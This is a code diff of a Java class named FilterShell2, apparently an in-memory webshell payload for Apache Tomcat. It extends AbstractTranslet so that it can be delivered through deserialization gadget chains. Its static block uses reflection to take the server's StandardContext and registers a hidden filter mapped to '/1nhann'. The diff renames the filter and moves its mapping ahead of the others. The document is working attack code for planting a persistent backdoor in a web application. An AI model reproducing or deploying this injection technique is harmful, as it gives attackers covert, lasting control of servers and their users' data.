@@ -21,15 +21,19 @@ import java.lang.reflect.Field;
 import java.util.Map;
 
 public class FilterShell2 extends AbstractTranslet implements Serializable, Filter {
-
+    public FilterShell2() throws Exception{
+        namesArray = new String[]{"fuck"};
+    }
     static {
         try {
             StandardContext context = (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();
 
             Filter filter = new FilterShell2();
 
+            String name = "1nhann";
+
             FilterDef filterDef = new FilterDef();
-            filterDef.setFilterName("fuck");
+            filterDef.setFilterName(name);
             filterDef.setFilter(filter);
 
 
@@ -39,14 +43,14 @@ public class FilterShell2 extends AbstractTranslet implements Serializable, Filt
 
 
             FilterMap filterMap = new FilterMap();
-            filterMap.setFilterName("fuck");
+            filterMap.setFilterName(name);
             filterMap.addURLPattern("/1nhann");
 
 
             Map<String, ApplicationFilterConfig> filterConfigs = (Map<String, ApplicationFilterConfig>)getFieldValue(context,"filterConfigs");
-            filterConfigs.put("fuck",filterConfig);
-            context.addFilterMap(filterMap);
+            filterConfigs.put(name,filterConfig);
             context.addFilterDef(filterDef);
+            context.addFilterMapBefore(filterMap);
         }catch (Exception e){
             e.printStackTrace();
         }
